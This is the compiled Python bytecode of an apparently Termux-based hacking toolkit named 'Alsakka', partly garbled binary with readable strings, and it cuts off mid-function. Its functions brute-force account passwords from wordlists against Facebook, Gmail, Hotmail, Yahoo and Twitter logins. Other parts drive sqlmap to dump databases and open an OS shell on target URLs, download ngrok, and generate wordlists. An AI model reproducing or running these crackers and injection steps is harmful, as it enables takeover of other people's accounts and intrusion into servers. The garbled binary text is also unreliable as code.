U
    �|�]Y �                   @   s  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlT d dlT zDd dlZd dlmZ d dlmZ d dlZd dlZd dlZd dlT W nR ek
�r   e �d� e �d� e �d� e �d� e �d	� e �d
� Y nX e�� ZdZed�Zed�Zed�ZddiZdd� Zdd� Z dd� Z!dd� Z"dd� Z#dd� Z$dd� Z%dd � Z&d!d"� Z'd#d$� Z(d%d&� Z)d'd(� Z*d)d*� Z+d+d,� Z,d-d.� Z-d/d0� Z.d1d2� Z/d3d4� Z0d5d6� Z1d7d8� Z2d9d:� Z3d dlZd;d<� Z4d=d>� Z5e5�  dS )?�    N)�*)�BeautifulSoup)�tqdmzpip install bs4zpip install fbchatzpip install requestszpip install tqdmzpip install mechanizezpip install youtube_dlz/[1;36m
Download Succes 
/sdcard/Alsakka/virus/�%T�%B�%Yz
User-agentz�Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 .Firefox/45.0,Mozilla/5.0 (X11; U; Linux i686 en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1c                  C   s`   d} d}d}d}t �dd�}|dkr,t| � |dkr<t|� |dkrLt|� |dkr\t|� d S )	Nz�
[1;35m            _    _           _    _
[1;31m           / \  | |___  __ _| | _| | ____ _
[1;34m          / _ \ | / __|/ _` | |/ / |/ / _` |
[1;33m         / ___ \| \__ \ (_| |   <|   < (_| |
[1;31m        /_/   \_\_|___/\__,_|_|\_\_|\_\__,_|
    z�
[1;33m                 _____ ___  _   _ _____
[1;35m                |_   _/ _ \| \ | | ____|
[1;34m                  | || | | |  \| |  _|
[1;36m                  | || |_| | |\  | |___
[1;31m                  |_| \___/|_| \_|_____|
    a  
[1;33m              __        ___    ____ _____ _   _
[1;35m              \ \      / / \  / ___| ____| | | |
[1;31m               \ \ /\ / / _ \| |  _|  _| | |_| |
[1;32m                \ V  V / ___ \ |_| | |___|  _  |
[1;34m                 \_/\_/_/   \_\____|_____|_| |_|
    a!  
[1;31m         _    _             __  __       _
[1;30m        / \  | |__   ___   |  \/  | __ _| | ____ _
[1;33m       / _ \ | '_ \ / _ \  | |\/| |/ _` | |/ / _` |
[1;31m      / ___ \| |_) | (_) | | |  | | (_| |   < (_| |
[1;34m     /_/   \_\_.__/ \___/  |_|  |_|\__,_|_|\_\__,_|
   �   �   �   �   ��randomZrandint�print)�a�t�wZabo�h� r   �	stools.py�alsakka%   s    r   c                  C   sD  d} d}d}d}d}d}d}d}d	}d
}	d}
d}d}d}d}t �dd�}|dkrXt| � |dkrht|� |dkrxt|� |dkr�t|� |dkr�t|� |dkr�t|� |dkr�t|� |dkr�t|� |dkr�t|� |dkr�t|	� |dkr�t|
� |dk�r
t|� |dk�rt|� |dk�r.t|� |dk�r@t|� d S )Na�  [1;31m
                                [1;33m   ___          ____
                               ,-[1;33m""   `.      < HONK >
                             ,'  [1;33m_   e )`-._ /  ----
                            /  ,' [1;33m`-._<.===-'[1;31m
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""
  <`-                          ;
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
[1;33m                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'    al  [1;35m
                  `...`
              ,#@######@@+`
            '##@@#@@@#@@@@#@.
          .@@+#@@@@#@@@@@++@##
         '@@@+++#@@@@#@#+++#@@@
        +#@@@+++++#@@#+++++#@###
       ,#@@@@+++++++#++++++#@#@#@
       ##@@@@+++++'++#+++++@@#@@@+
      +#@@@@@+++'+'::;#:+++##@@@##
      @#@@@#@##++++++++####@#@##@@+
     .@@@@@#+#++#+++++++++#++@@###@
     +@@@++++++#++'##;++#'#++++#@#@
     ##+++++++#+++#@##+++@+++++++##`
     @#+++++++#+++@###+++@++++++'##`
     ##@#'+++++#+++#@+++#+#+++'+@##`
     ;#@@@#++#++#+++++++++#'+@###@@
     `#@@@@@@##;#+''++'#;##@@@#####
      @@@@@@@++++#+;;+#++++@#@@###,
      ,#@@@@@+++++#''#+++++######@
       ####@@+++++++#++++++######.
        @@@@@++++++#@#+++++#@@##'
        `@@@@++++@@@@@@++++##@#'
          #@@++@@@@@@@@@@++@@#;
           :@@@@@@@@@@@#@@#@+`
             ;#@@@@@@@@##@'.
               `:'+##++;,
    a8  [1;36m
       .... NO! ...                  ... MNO! ...
      ..... MNO!! ...................... MNNOO! ...
     ..... MMNO! ......................... MNNOO!! .
    ..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
    ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
        ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
        ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
        ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...
        ....... MMMMM Amin OPPMM Rifi   OMI! ....
         ...... MMMM::   o.,OPMP,.o   ::I!! ...
             .... NNM:::.,,OOPM!P,.::::!! ....
              .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
             ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
               .. MMMMMNNOOMMNNIIIPPPOO!! ......
              ...... MMMONNMMNNNIIIOO!..........
           ....... MN MOMMMNNNIIIIIO! OO ..........
        ......... MNO! IiiiiiiiiiiiI OOOO ...........
      ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
       .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
       ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
          ...... OO! ................. ON! .......
    u�  [1;31m
                      ````....````
               `.:oyhmNMMMMMMMMNmdyo/-`
             `./ymMMMMMMNNMMMMMMMNMMMMMMNho-`
          .+hMMMMMMMMMM+ .::/:. -MMMMMMMMMMdo-`
       `.sNMMMMMMMMMMMm          dMMMMMMMMMMMMy:`
       .oNMMMMMMMMMMMMM/          /MMMMMMMMMMMMMMy-`
    `:mMMMMMMMMMMMMMMm::::::::::::NMMMMMMMMMMMMMMN+`
   `+MMMMMMMMMMMMMMmssssssssssssssssNMMMMMMMMMMMMMMy.
  `oMMMMMMMMMMMMNy/..----:::::-----..+dMMMMMMMMMMMMMh.
 `/MMMMMMMMMMMMMMMMMs  [1;32m°[1;31m -+:` [1;32m °[1;31m  :NMMMMMMMMMMMMMMMMMs`
 .mMMMMMMMMMMMMMMMMM+    `/ms.    .NMMMMMMMMMMMMMMMMMM:
`+MMMMMMMMMMMMMMMMMMMdyydMMMMMmhyhNMMMMMMMMMMMMMMMMMMMh`
`hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.
`mMMMMMMMMMMMMMMMMMMN+mMMMMMMMMMNsyMMMMMMMMMMMMMMMMMMMM-
`dMMMMMMMMMMMMMMMMMMy  :hMMMMMmo` :MMMMMMMMMMMMMMMMMMMM-
`yMMMMMMMMMMMMMMMMMM+  `oMMMMMh-  `MMMMMMMMMMMMMMMMMMMN.
 /MMMMMMMMMNdyo+/:::` oNMMMMMMMMh- :::/+oshmMMMMMMMMMMy`
 .dMMMMMMy.          :MMMN`  :MMMy          `/NMMMMMMN-
  :NMMMMN           sMMMMMh .mMMMMd.          oMMMMMMo`
  `/NMMMm           :NMMMMo  dMMMMh           +MMMMMs`
   `:NMMM`           -NMMN.  /MMMd`           yMMMMo`
     -hMM+            .mMy    mMd`           `NMMm/`
      `/mm             .m.    +m`            oMNo.
        `+-             `     `.            `do.
          ```                              `.`
             ````                      ````
                ``.:+osyhhhhhhyys+/-```
                         ``````
    aX  [1;31m
          .:okOOOkdc'           'cdkOOOko:.
        .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
       :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
      'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
      oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
      dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
      lOOOOOOOO.         ;d;         ,OOOOOOOOl
      .OOOOOOOO.   .;           ;    ,OOOOOOOO.
       cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
        oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
         lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
          ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
           .dOOo   .OOOOocccxOOOO.   xOOd.
             ,kOl  .OOOOOOOOOOOOO. .dOk,
               :kk;.OOOOOOOOOOOOO.cOk:
                 ;kOOOOOOOOOOOOOOOk:
                   ,xOOOOOOOOOOOx,
                     .lOOOOOOOl.
                        ,dOd,
                          .    a  [1;31m
                        ..:::::::::..
                    ..:::aad8888888baa:::..
                .::::d:?88888888888?::8b::::.
              .:::d8888:?88888888??a888888b:::.
            .:::d8888888a8888888aa8888888888b:::.
           ::::dP::::::::88888888888::::::::Yb::::
          ::::dP:::::::::Y888888888P:::::::::Yb::::
         ::::d8:::::::::::Y8888888P:::::::::::8b::::
        .::::88::::::::::::Y88888P::::::::::::88::::.
        :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
        :::::::Y88888888888P::|::Y88888888888P:::::::
        ::::::::::::::::888:::|:::888::::::::::::::::
        `:::::::::::::::8888888888888b::::::::::::::'
         :::::::::::::::88888888888888::::::::::::::
          :::::::::::::d88888888888888:::::::::::::
           ::::::::::::88::88::88:::88::::::::::::
            `::::::::::88::88::88:::88::::::::::'
              `::::::::88::88::P::::88::::::::'
                `::::::88::88:::::::88::::::'
                   ``:::::::::::::::::::''
                        ``:::::::::''
    a�  [1;32m
           ____,'`-,
      _,--'   ,/::.;
   ,-'       ,/::,' `---.___        ___,_
   |       ,:';:/        ;'"`;"`--./ ,-^.;--.
   |:     ,:';,'         '         `.   ;`   `-.
    \:.,:::/;/ -:.                   `  | `     `-.
     \:::,'//__.;  ,;  ,  ,  :.`-.   :. |  ;       :.
      \,',';/O)^. :'  ;  :   '__` `  :::`.       .:' )
      |,'  |\__,: ;      ;  '/O)`.   :::`;       ' ,'
           |`--''            \__,' , ::::(       ,'
           `    ,            `--' ,: :::,'\   ,-'
            | ,;         ,    ,::'  ,:::   |,'
            |,:        .(          ,:::|   `
            ::'_   _   ::         ,::/:|
           ,',' `-' \   `.      ,:::/,:|
          | : _  _   |   '     ,::,' :::
          | \ O`'O  ,',   ,    :,'   ;::
           \ `-'`--',:' ,' , ,,'      ::
            ``:.:.__   ',-','        ::'
              `--.__, ,::.         ::'
                   |:  ::::.       ::'
                   |:  ::::::    ,::

    a�  [1;35m
            XX                                    XX
          XX..X                                 X..XX
        XX.....X                                X.....XX
   XXXXX.....XX                                  XX.....XXXXX
  X |......XX%,.@                              @#%,XX......| X
  X |.....X  @#%,.@                          @#%,.@  X.....| X
  X  \...X     @#%,.@                      @#%,.@     X.../  X
   X# \.X        @#%,.@                  @#%,.@        X./  #
    ##  X          @#%,.@              @#%,.@          X   #
  , "# #X            @#%,.@          @#%,.@            X ##
     `###X             @#%,.@      @#%,.@             ####'
    . ' ###              @#%.,@  @#%,.@              ###`"
        . ";"                @#%.@#%,.@                ;"` ' .
        '                   @#%,.@                   ,.
        ` ,                @#%, @ @@                `
                          @@@     @@@                  .
    aQ  [1;31m
                        aa@@@@@@@@@@@@@aa
                     a@@@@@@@@@@@@@@@@@@@@@a
                   a@@@@@@@@@@@@@@@@@@@@@@@@@a
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                 @@@@@@@~~~~@@@@@@@@@~~~~@@@@@@@
                 @@@@@@      @@@@@@@      @@@@@@
                 @@@@@@@aaaa@@@@@@@@@aaaa@@@@@@@
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                 `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'
                  @@@@@@@@~@@@~@@@~@@@~@@@@@@@@
                   @@@@@@@@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@~@@@~@@@~@@@@@@@@
                     @@@@@@@@@@@@@@@@@@@@@@@
                      @@@@@@@@~@@@~@@@@@@@@
                       `@@@@@@@@@@@@@@@@@'
                           ~~@@@@@@@~~
    aa  [1;35m
                          ooo
                         $ o$
                        o $$
              ""$$$    o" $$ oo "
          " o$"$oo$$$"o$$o$$"$$$$$ o
         $" "o$$$$$$o$$$$$$$$$$$$$$o     o
      o$"    "$$$$$$$$$$$$$$$$$$$$$$o" "oo  o
     " "     o  "$$$o   o$$$$$$$$$$$oo$$
    " $     " "o$$$$$ $$$$$$$$$$$"$$$$$$$o
  o  $       o o$$$$$"$$$$$$$$$$$o$$"""$$$$o " "
 o          o$$$$$"    "$$$$$$$$$$ "" oo $$   o $
 $  $       $$$$$  $$$oo "$$$$$$$$o o $$$o$$oo o o
o        o $$$$$oo$$$$$$o$$$$ ""$$oo$$$$$$$$"  " "o
"   o    $ ""$$$$$$$$$$$$$$  o  "$$$$$$$$$$$$   o "
"   $      "$$$$$$$$$$$$$$   "   $$$"$$$$$$$$o  o
$   o      o$"""""$$$$$$$$    oooo$$ $$$$$$$$"  "
$      o""o $$o    $$$$$$$$$$$$$$$$$ ""  o$$$   $ o
 o     " "o "$$$$  $$$$$""""""""""" $  o$$$$$"" o o
 "  " o  o$o" $$$$o   ""           o  o$$$$$"   o
  $         o$$$$$$$oo            "oo$$$$$$$"    o
  "$   o o$o $o o$$$$$"$$$$oooo$$$$$$$$$$$$$$"o$o
    "o oo  $o$"oo$$$$$o$$$$$$$$$$$$"$$$$$$$$"o$"
     "$ooo $$o$   $$$$$$$$$$$$$$$$ $$$$$$$$o"
        "" $$$$$$$$$$$$$$$$$$$$$$" """"
                         """"""
    a�  [1;34m
                       @@@
                         @@@
                          @@@
                          @@@
                  @@@@@@@@@@@@@@@@@@@@@@
                 @@@@@@@@@@@@@@@@@@@@@@@@@@
              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
             @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
          @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
        @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@
       @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
       @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
       @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
       @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
        @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@
          @@@@@@@                        @@@@@@@
            @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@
              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
               @@@@@@@@@@@@@@@@@@@@@@@@@@
                 @@@@@@@@@@@@@@@@@@@@@@
    aD  [1;31m                             __
                            |  |
                            |  |
                        ___/____\___
                   _- ~              ~  _
                - ~                      ~ -_
              -                               _
            -         /\            /\          _
           -         / *\          / *\          _
          _         /____\        /____\          _
          _                  /\                   _
          _                 /__\                  _
          _      |\                      /|       _
           -     \ `\/\/\/\/\/\/\/\/\/\/' /      _
            -     \                      /      -
              ~    `\/^\/^\/^\/^\/^\/^\/'      ~
                ~                            -~
                 `--_._._._._._._._._._.._--'

    a  [1;36m
         `://-::.`                          `-++syhs`
          dNNNNNNNds-                      `odNNmddmm`
          /mmmmdddmNdo-                   :hmdhhddmN+
           /Nmmdddhhho++`                /hdhhhhhhdm-
            hmdhhhyho/s/o.              /ddhhyyyyyhm:
            omdyyyso/.-s/s.            .hhdyyyysssyho
            omdyyyys+-..o/s```..```.``.oddyyo+/:://oo`
            /mddysss+::-.+y/``..``...`.ymhhho/:.-/+s/`
            `+ddyyss/---.`sh.``-``...`.hdyyhssss+::::/++:`
          -+syyyyyyy:oo:..-y: `````..``dsyyyyhhh/--:+sdNNm:
        .smmdhysosyy.-:...-+y//``  ``:-mdhhhyyysoshddmmNNNN/
        ymmdsyyyssso/::-:/+yNd/`     /dNNdyhhhhhshdmmmmmNMMm`
       +mmmhosyyyys::+shdmNNd:`.-    ::sdddhddddhhdmmmmmNMN/
       oNmmhyyyyhdhhhdhhs/+---``-` ``/.`-.:`:+odh+sydmNMNy-
     ``.+mmmmddmmdysmh//-.:--.:.-....:-.---..........:+/-`
       ..-ohNNNho::://::://+////::::::::::::-----.......``
        `...---------:::::::::::::------------.......````
           `````````````...........```````````````````
    ag  [1;31m
                     ,
                     |'.             ,
                     |  '-._        / )
                   .'  .._  ',     /_'-,
                  '   /  _'.'_\   /._)')
                 :   /  '_' '_'  /  _.'
                 |E |   |Q| |Q| /   /
               .'  _\  '-' '-'    /
              .'--.(S     ,__` )  /
                    '-.     _.'  /
[1;32m                  __.--'----(   /
              _.-'     :   __\ /
             (      __.' :'  :Y
              '.   '._,  :   :|
                '.     ) :.__:|
                  \    \______/
                   '._________]
    a�  [1;31m
                            ........
                            ;::;;::;,
                            ;::;;::;;,
                           ;;:::;;::;;,
           .vnmmnv%vnmnv%,.;;;:::;;::;;,  .,vnmnv%vnmnv,
        vnmmmnv%vnmmmnv%vnmmnv%;;;;;;;%nmmmnv%vnmmnv%vnmmnv
      vnmmnv%vnmmmmmnv%vnmmmmmnv%;:;%nmmmmmmnv%vnmmmnv%vnmmmnv
     vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmnv%vnmmmnv%vnmmmnv
    vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmmmnv%vnmmmnv%vnmmmnv
   vnmmnv%vnmmmmmnv%vnmm;mmmmmmnv%vnmmmmmmmm;mmnv%vnmmmnv%vnmmmnv,
  vnmmnv%vnmmmmmnv%vnmm;  mmmmmnv%vnmmmmmmm;  mmnv%vnmmmnv%vnmmmnv
  vnmmnv%vnmmmmmnv%vn;;    mmmmnv%vnmmmmmm;;    nv%vnmmmmnv%vnmmmnv
 vnmmnv%vnmmmmmmnv%v;;      mmmnv%vnmmmmm;;      v%vnmmmmmnv%vnmmmnv
 vnmmnv%vnmmmmmmnv%vnmmmmmmmmm;;       mmmmmmmmmnv%vnmmmmmmnv%vnmmmnv
 vnmmnv%vnmmmmmmnv%vnmmmmmmmmmm;;     mmmmmmmmmmnv%vnmmmmmmnv%vnmmmnv
 vnmmnv%vnmmmmm nv%vnmmmmmmmmmmnv;, mmmmmmmmmmmmnv%vn;mmmmmnv%vnmmmnv
 vnmmnv%vnmmmmm  nv%vnmmmmmmmmmnv%;nmmmmmmmmmmmnv%vn; mmmmmnv%vnmmmnv
 `vnmmnv%vnmmmm,  v%vnmmmmmmmmmmnv%vnmmmmmmmmmmnv%v;  mmmmnv%vnnmmnv'
  vnmmnv%vnmmmm;,   %vnmmmmmmmmmnv%vnmmmmmmmmmnv%;    mmmnv%vnmmmmnv
   vnmmnv%vnmmmm;;,   nmmm;,              mmmm;;     mmmnv%vnmmmmnv'
   `vnmmnv%vnmmmmm;;,.         mmnv%v;,            mmmmnv%vnmmmmnv'
    `vnmmnv%vnmmmmmmnv%vnmmmmmmmmnv%vnmmmmmmnv%vnmmmmmnv%vnmmmmnv'
      `vnmvn%vnmmmmmmnv%vnmmmmmmmnv%vnmmmmmnv%vnmmmmmnv%vnmmmnv'
          `vn%vnmmmmmmn%:%vnmnmmmmnv%vnmmmnv%:%vnmmnv%vnmnv'

    r   �   r
   r   r	   �   �   �   �   �	   �
   �   �   �   �   r   )Zheader_1Zheader_2Zheader_3Zheader_4Zheader_5Zheader_6Zheader_7Zheader_8Zheader_9Z	header_10Z	header_11Z	header_12Z	header_13Z	header_14Z	header_15Zhdr_numr   r   r   �meK   s\    



r!   c                  C   s�   t �� } t�d� t�  t�  td�}td�}d}t|d�}|D ]h}|�� }| �	|� ||d�}| j
||d�}|j}|dkr�d	|ks�d
|kr�td|� t�  q@td|� q@d S )N�clearz([1;34mEnter Email/phone/id >> : [1;32mz"[1;35mEnter wordlist >> : [1;32mzhttps://www.facebook.com/login�r)�email�pass��datazhttps://www.facebook.com/z5login/device-based/regular/login/?login_attempt=1&lwvz/checkpoint/zA[1;33m[[1;32m+[1;33m][1;34m Found Password Cracked >> [1;32mz>[1;33m[[1;31m-[1;33m][1;35m password not found  >>[1;31m )�requestsZSession�os�systemr   r!   �input�open�rstrip�get�post�urlr   �exit)r   r$   �listr0   �f�password�formr   r   r   r   �facebook�  s$    




r6   c                  C   s�   t �d� t�  t�  td�} td�}t�dd�}|��  |��  t	|d�}|D ]<}z |�
| |� td|� W  q�W qP   td|� Y qPX qPd S )	Nr"   z'[1;34mEnter Email Hotmail >> :[1;32m z'[1;31mEnter List Password >> : [1;32m�smtp.live.com�K  r#   z9[1;33m[[1;32m+[1;33m][1;31m password Found >> [1;32mz:[1;33m[[1;31m-[1;33m][1;33m password not found [1;31m�r)   r*   r   r!   r+   �smtplib�SMTP�ehlo�starttlsr,   �loginr   �r$   Zpas�serverr   r4   r   r   r   �Hotmail�  s     



rA   c                  C   s�   t �d� t�  t�  td�} td�}t�dd�}|��  |��  t	|d�}|D ]D}|�
� }z |�| |� td|� W  q�W qP   td|� Y qPX qPd S )	Nr"   z&[1;36mEnter Target Gmail >> :[1;32m z"[1;35mEnter wordlist >> :[1;32m �smtp.gmail.comr8   r#   zA[1;32m[[1;33m+[1;32m][1;31m Found Password Cracked >> [1;32mz:[1;33m[[1;31m-[1;33m][1;32m password not crack [1;31m)r)   r*   r   r!   r+   r:   r;   r=   r<   r,   r-   r>   r   )r$   ZpaZseverr#   r4   r   r   r   �Gmail�  s"    



rC   c                  C   s�   t �d� t�  t�  td�} td�}t�dd�}|��  |��  t	|d�}|D ]<}z |�
| |� td|� W  q�W qP   td|� Y qPX qPd S )	Nr"   z%[1;31mEnter Email Yahoo >> :[1;32m z'[1;35mEnter List Password >> : [1;32mzsmtp.mail.yahoo.comr8   r#   z9[1;33m[[1;31m+[1;33m] [1;31mpassword Found >> [1;33mz:[1;33m[[1;31m-[1;33m] [1;32mpassword not found [1;31mr9   r?   r   r   r   �yahoo  s     



rD   c                  C   s�   t �d� t�  t�  td�} td�}t�� }d}|�|� t|d�}|�� D ]�}|�	� }|�
ddi� |jdd	� | |jd
< ||jd< |��  |�� }d|ks�d|kr�td�|�� t�  qNd|kr�td� td� t�  qNd|krNtd|� qNd S )Nr"   z'[1;36mEnter Email Twitter >> : [1;32mz#[1;34mEnter Woordlist >> : [1;32mz https://mobile.twitter.com/loginr#   �httpz211.21.120.163:8080r   �Znrzsession[username_or_email]zsession[password]z;https://mobile.twitter.com/account/login_challenge?platform�homezC[1;31m[[1;32m+[1;31m][1;34m found password >>[1;35m {}[1;32m z)https://mobile.twitter.com/account/lockedz[1;34mSet Email is Bloced !!!z[1;32mressaye in 1 hoursz8https://mobile.twitter.com/login/error?username_or_emailz:[1;33m[[1;31m*[1;33m][1;31m not found password[1;32m )r)   r*   r   r!   r+   �	mechanize�Browserr,   �	readlinesr-   Zset_proxies�select_formr5   �submitZgeturlr   �formatr1   )r$   ZpasswZbrowser�log�sr4   r0   r   r   r   �Twitter  s4    




rP   c                  C   sV  t �d� t�  t�  td�} td� t| d�}tg �}tg �}d}td�|��}|dkr�|�	�  t| d�}t
|�� �}td	� td
�|| �� td	� �qR|�|� |D ]�}t
|�dkr�||kr�|�|� |�|� |�d� || }	|| }
t
|	�dk�r|�|	� |�d� |	|
kr�t
|
�dkr�|�|
� |�d� q�t|�d }td� qDd S )Nr"   z([1;34mEnter name Woordlist >> :[1;32m z�[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_r   r   z[1;31mEnter [1;35m{} [1;32mr1   r#   a�  [1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_[1;34m_z>[1;31m>>[1;32m {}[1;33m Passwords in ===>[1;35m {}[1;35m r   �
a�  [1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_[1;36m_)r)   r*   r   r!   r+   r   r,   �setrM   �close�lenrJ   �add�write�int)Zaaa�fileZaaZoioZkk�bZqqZll�i�c�dr   r   r   �	Woordlist-  sH    









r]   c               	   C   s�  t �d� t�  t�  td� td� td� td� td� td�} | dksV| d	krvtd
�}t �d| � t�d� | dks�| dkr�td�}t �d| � t�d� | dks�| dkr�td�}t �d| � t�d� | dks�| dk�r�td�}td�}td�}d}d}t	j
|dd�}	t|	jd �}
|�d�d }t|d ��2}t|	j|d!�|
| d"d#�D ]}|�|� �qXW 5 Q R X t �d$� t �d%� td&� t �d'� td(�}t �d)| � td*� | d+k�s�| d,k�r�t�  ntd-� t�d.� t�  d S )/Nr"   z*[1;33m[[1;31m01[1;33m][1;32m ngrok tcpz+[1;33m[[1;31m02[1;33m][1;32m ngrok httpz,[1;33m[[1;31m03[1;33m][1;32m ngrok httpsz/[1;33m[[1;31m04[1;33m][1;32m Download ngrokz.[1;33m[[1;31m00[1;33m][1;32m back ngrok


� [1;34mEnter number >> :[1;32m �1�01z"[1;31mEnter port tcp >> : [1;32mzcd && ./ngrok tcp r   �2�02z#[1;31mEnter port http >> :[1;32m zcd && ./ngrok http �3�03z$[1;31mEnter port https >> :[1;32m �4�04r   r   r   �   zChttps://github.com/ABDULLAHALSAKKA/ngrok/blob/master/ngrok?raw=trueT��stream�content-length�/������wb��
chunk_size� KB��iterableZtotalZunitz:mv 'ngrok?raw=true' /data/data/com.termux/files/home/ngrokzcd && chmod +x ngrokz[1;31mDownload Succes homez#termux-open-url 'https://ngrok.com'z#[1;34mEnter URL Token >> :[1;32m zcd && z[1;32msetup ngrok�0�00z([1;33m[[1;31m-[1;33m][1;31m ERROR !!r   )r)   r*   r   r!   r   r+   �time�sleep�strftimer(   r.   rW   �headers�splitr,   r   �iter_contentrV   �myprint�ngrok)�yZtcprE   Zhttps�now�bulan�tahunro   r0   r#   �size�filenamer3   r'   �tokenr   r   r   r|   S  sZ    







r|   c                  C   s   t �d� t�  t�  td� td� td� td� td� td�} | dksX| d	k�r0td
�}t �d| d � td�}t �d| d | d � td�}t �d| d | d | d � td�}t �d| d | d | d | d � td�}t �d| d | d | d | d � td� t�  | dk�sD| dk�rhtd�}t �d| � td� t�  | dk�s|| dk�r�td�}t �d| d  � td� t�  | d!k�s�| d"k�r�t �d#� t�  | d$k�s�| d%k�r�t�  ntd&� t�	d'� t�  d S )(Nr"   z'[1;33m[[1;31m01[1;33m][1;35m sqlmapz-[1;33m[[1;31m02[1;33m][1;35m shell sqlmapz0[1;33m[[1;31m03[1;33m][1;35m scan server sqlz0[1;33m[[1;31m04[1;33m][1;35m Download sqlmapz'[1;33m[[1;31m00[1;33m][1;35m back

r^   r`   r_   z[1;31mEnter URL >> : [1;32mz(cd && cd sqlmap && python2 sqlmap.py -u z --dbsz [1;31mEnter tables >> [1;32m: z -D z	 --tablesz[1;31mEnter _user >> : [1;32mz -T z
 --columnsz"[1;31mEnter username >> : [1;32mz -C z --dumpz"[1;31mEnter password >> : [1;32mz[1;34mEnter exit :rd   rc   z&[1;33mEnter Domen server >> : [1;32mz(nmap -v -sV --script=http-sql-injection rb   ra   z[1;31mEnter URL >> :[1;32m z"cd sqlmap && python2 sqlmap.py -u z --os-shellrf   re   zRcd && git clone https://github.com/sqlmapproject/sqlmap && cd sqlmap && chmod +x *rt   rs   �&[1;33m[[1;31m-[1;33m][1;35m ERROR r   )
r)   r*   r   r!   r   r+   �sqlmapr{   ru   rv   )r}   r0   r'   �user�u�pr\   r   r   r   r�   �  sP    
"**

r�   c                  C   sl  t �d� t�  t�  td� td� td� td� td� td� td� td	� td
